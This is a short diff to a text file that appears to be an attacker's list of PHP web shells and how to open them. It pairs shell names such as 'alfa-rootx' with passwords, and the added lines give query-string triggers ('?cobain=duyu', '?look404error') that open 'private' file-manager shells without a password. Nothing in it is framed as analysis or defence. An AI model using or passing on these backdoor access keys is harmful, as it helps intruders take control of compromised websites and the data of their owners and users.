@@ -1,2 +1,4 @@
 alfa-rootx.txt > who$0918
 text-manager > 0918|who$0918
+php-file-manager-private > php-file-manager-private.php?cobain=duyu <<<== No Password {Tambahkan ??cobain=duyu}
+php-file-default-private > php-file-default-private.php?look404error <<<== No Password {Tambahkan ??look404error}
